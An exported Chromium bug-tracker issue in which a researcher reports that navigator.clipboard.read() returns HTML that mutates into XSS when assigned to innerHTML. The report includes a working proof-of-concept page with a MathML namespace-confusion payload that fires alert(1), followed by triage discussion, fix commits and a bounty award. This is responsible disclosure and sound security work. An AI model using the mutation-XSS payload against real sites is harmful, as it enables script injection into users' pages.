# Security: navigator.clipboard.read() can lead to mutation XSS

| Field | Value |
|-------|-------|
| **Issue ID** | [40059358](https://issues.chromium.org/issues/40059358) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>DataTransfer |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | mi...@bentkowski.info |
| **Assignee** | xi...@chromium.org |
| **Created** | 2022-04-12 |
| **Bounty** | $3,000.00 |

## Description

If clipboard contains HTML data, navigator.clipboard.read() attempts to parse it in order to sanitize it. Even the Clipboard API spec [1] says that:

 > data contains the sanitized copy of text/html format

This may lead to a conclusion that it should be safe to assign the HTML directly to innerHTML (as it is already sanitized).

Consider the following snippet:

    const items = await navigator.clipboard.read();
    const htmlBlob = await items[0].getType("text/html"); 
    const html = await htmlBlob.text();
    
    // html is already sanitized, so this should be safe, right?
    output.innerHTML = html;


Unfortunately, because the HTML is serialized internally by Chromium, and then parsed again on assignment to innerHTML, this can lead to mutation XSS. In fact,a payload really similar to another one that I found two years ago in DOMPurify, works in this case [2] (in the article linked in [2] I describe exactly the root cause of the issue).

Please note that this issue is similar to other copy&paste issues I reported in the past (https://crbug.com/chromium/1011950, https://crbug.com/chromium/1040755, https://crbug.com/chromium/1065761, https://crbug.com/chromium/1141350), although this one requires some specific code in the webpage itself. In my opinion, though, this type of code is quite likely to happen in the wild because the returned HTML is advertised as "sanitized".

Here's the PoC:

<p><button id=b1>Step 1. Put payload in the clipboard</button></p>
<p><button id=b2>Step 2. Get HTML from clipboard and assign to innerHTML</button></p>
<div id=output></div>

<script>
  const output = document.getElementById('output');
  
  document.oncopy = ev => {
    ev.preventDefault();
    ev.clipboardData.setData('text/html', `<form><math><mtext></form><form><mglyph><xmp></math><img src onerror=alert(1)></xmp>`);
  };
  
  b1.onclick = () => document.execCommand('copy');
  
  b2.onclick = async () => {
    const items = await navigator.clipboard.read();
    const htmlBlob = await items[0].getType("text/html"); 
    const html = await htmlBlob.text();
    
    // this fires an alert
    output.innerHTML = html;
  };
  
</script>

When it comes to prevention, DOMPurify ultimately employed a strong checking of namespace switching in the HTML (check: https://github.com/cure53/DOMPurify/pull/495).

A much simpler solution is employed by Angular; it just tries to reparse the HTML repeatedly to check whether it is stable. Check: https://github.com/angular/angular/blob/master/packages/core/src/sanitization/html_sanitizer.ts#L254

[1]: https://w3c.github.io/clipboard-apis/#:~:text=data%20contains%20the%20sanitized%20copy%20of%20text/html%20format
[2]: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

## Timeline

### [Deleted User] (2022-04-12)

[Empty comment from Monorail migration]

### mp...@chromium.org (2022-04-13)

[Empty comment from Monorail migration]

### ts...@chromium.org (2022-04-19)

[Empty comment from Monorail migration]

[Monorail components: Blink>DataTransfer]

### [Deleted User] (2022-04-20)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-04-20)

[Empty comment from Monorail migration]

### ad...@google.com (2022-04-21)

tsepez@ please set a FoundIn and OS labels, thanks.

### xi...@chromium.org (2022-04-21)

We are already sanitizing for Clipboard.read() [1] but apparently this test case escaped that :(

[1] https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/clipboard/clipboard_reader.cc;l=153;drc=8bb91dcad5d00c2ea215966b0a852abe84abba90;bpv=1;bpt=1

### xi...@chromium.org (2022-04-21)

I don't have bandwidth to work on it right now. I'll take a look again in May, or if that's too slow, please feel free to reassign.

### do...@chromium.org (2022-04-26)

Looks like the code in question has existed since 2020 in M86.

xiaochengh: medium severity security bugs are ideally fixed in the next stable release of Chrome[1]. If you don't have bandwidth to look at it immediately, please help find someone who can in order to ensure that potential security bugs get addressed in a timely manner. Also +cc some other OWNERs of this file who might be able to pick this up.

1. https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#toc-medium-severity

### [Deleted User] (2022-04-26)

[Empty comment from Monorail migration]

### [Deleted User] (2022-04-26)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2022-04-26)

Add more people who know about markup sanitization. Feel free to take it over.

### xi...@chromium.org (2022-04-27)

I got some time to work on this today

### gi...@appspot.gserviceaccount.com (2022-04-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/19280353fb92d0ff7d048d7cec28d6a23befbce0

commit 19280353fb92d0ff7d048d7cec28d6a23befbce0
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Thu Apr 28 03:15:16 2022

Markup sanitization should iterate until markup is stable

There are cases where parsing a markup and then serializing it does not
round trip, which can be used to inject XSS. Current sanitization code
only does one round of parsing and serializing, which does not remove
XSS injections that hide deeper.

Hence this patch makes sanitization algorithm iterate until the markup
is stable, or declares failure if it doesn't stabilize after many tries.

Fixed: 1315563
Change-Id: I4a3ebe1fda6df0e04a24d863b2b48df2110af209
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3611826
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Commit-Position: refs/heads/main@{#997032}

[modify] https://crrev.com/19280353fb92d0ff7d048d7cec28d6a23befbce0/third_party/blink/renderer/core/editing/serializers/serialization.cc
[modify] https://crrev.com/19280353fb92d0ff7d048d7cec28d6a23befbce0/third_party/blink/web_tests/editing/pasteboard/paste-svg-use.html
[add] https://crrev.com/19280353fb92d0ff7d048d7cec28d6a23befbce0/third_party/blink/web_tests/external/wpt/clipboard-apis/async-navigator-clipboard-read-sanitize.https.html


### [Deleted User] (2022-04-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-04-28)

[Empty comment from Monorail migration]

### xi...@chromium.org (2022-04-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-04-29)

Merge review required: M102 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2022-04-29)

1. Why does your merge fit within the merge criteria for these milestones?

Security fix.

2. What changes specifically would you like to merge? Please link to Gerrit.

https://chromium-review.googlesource.com/c/chromium/src/+/3611826

3. Have the changes been released and tested on canary?

Yes.

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No.

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents

N/A

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

N/A. This is no a merge to the stable channel.

### sr...@google.com (2022-05-02)

Merge approved for M102 branch: pls refer to go/chrome-branches for more info

### xi...@chromium.org (2022-05-02)

+jarhar for code review https://chromium-review.googlesource.com/c/chromium/src/+/3621618

### gi...@appspot.gserviceaccount.com (2022-05-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b03797bdb1dfc960c06fc61e5ae4075e2c53454b

commit b03797bdb1dfc960c06fc61e5ae4075e2c53454b
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Mon May 02 23:43:40 2022

[M102] Markup sanitization should iterate until markup is stable

There are cases where parsing a markup and then serializing it does not
round trip, which can be used to inject XSS. Current sanitization code
only does one round of parsing and serializing, which does not remove
XSS injections that hide deeper.

Hence this patch makes sanitization algorithm iterate until the markup
is stable, or declares failure if it doesn't stabilize after many tries.

(cherry picked from commit 19280353fb92d0ff7d048d7cec28d6a23befbce0)

Fixed: 1315563
Change-Id: I4a3ebe1fda6df0e04a24d863b2b48df2110af209
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3611826
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#997032}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3621618
Auto-Submit: Xiaocheng Hu <xiaochengh@chromium.org>
Reviewed-by: Joey Arhar <jarhar@chromium.org>
Commit-Queue: Joey Arhar <jarhar@chromium.org>
Cr-Commit-Position: refs/branch-heads/5005@{#363}
Cr-Branched-From: 5b4d9450fee01f821b6400e947b3839727643a71-refs/heads/main@{#992738}

[modify] https://crrev.com/b03797bdb1dfc960c06fc61e5ae4075e2c53454b/third_party/blink/renderer/core/editing/serializers/serialization.cc
[modify] https://crrev.com/b03797bdb1dfc960c06fc61e5ae4075e2c53454b/third_party/blink/web_tests/editing/pasteboard/paste-svg-use.html
[add] https://crrev.com/b03797bdb1dfc960c06fc61e5ae4075e2c53454b/third_party/blink/web_tests/external/wpt/clipboard-apis/async-navigator-clipboard-read-sanitize.https.html


### [Deleted User] (2022-05-02)

LTS Milestone M96

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2022-05-03)

[Empty comment from Monorail migration]

### rz...@google.com (2022-05-03)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-03)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2022-05-03)

1. Just https://crrev.com/c/3623277
2. Low, no conflicts
3. 102
4. Yes

### gm...@google.com (2022-05-09)

[Empty comment from Monorail migration]

### gm...@google.com (2022-05-17)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-05-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f4c3bd0a164b9557e66b42be36e7af8582710240

commit f4c3bd0a164b9557e66b42be36e7af8582710240
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Wed May 18 03:21:02 2022

[M96-LTS] Markup sanitization should iterate until markup is stable

There are cases where parsing a markup and then serializing it does not
round trip, which can be used to inject XSS. Current sanitization code
only does one round of parsing and serializing, which does not remove
XSS injections that hide deeper.

Hence this patch makes sanitization algorithm iterate until the markup
is stable, or declares failure if it doesn't stabilize after many tries.

(cherry picked from commit 19280353fb92d0ff7d048d7cec28d6a23befbce0)

Fixed: 1315563
Change-Id: I4a3ebe1fda6df0e04a24d863b2b48df2110af209
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3611826
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#997032}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3623277
Commit-Queue: Zakhar Voit <voit@google.com>
Reviewed-by: Jana Grill <janagrill@google.com>
Owners-Override: Jana Grill <janagrill@google.com>
Cr-Commit-Position: refs/branch-heads/4664@{#1632}
Cr-Branched-From: 24dc4ee75e01a29d390d43c9c264372a169273a7-refs/heads/main@{#929512}

[modify] https://crrev.com/f4c3bd0a164b9557e66b42be36e7af8582710240/third_party/blink/renderer/core/editing/serializers/serialization.cc
[modify] https://crrev.com/f4c3bd0a164b9557e66b42be36e7af8582710240/third_party/blink/web_tests/editing/pasteboard/paste-svg-use.html
[add] https://crrev.com/f4c3bd0a164b9557e66b42be36e7af8582710240/third_party/blink/web_tests/external/wpt/clipboard-apis/async-navigator-clipboard-read-sanitize.https.html


### vo...@google.com (2022-05-18)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-05-24)

Congratulations, Michal! The VRP Panel has decided to award you $3,000 for this report. Thank you for your efforts and reporting this issue to us! 

### am...@chromium.org (2022-05-24)

[Empty comment from Monorail migration]

### ja...@chromium.org (2022-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-21)

[Empty comment from Monorail migration]

### am...@google.com (2022-07-27)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1315563?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40059358)*
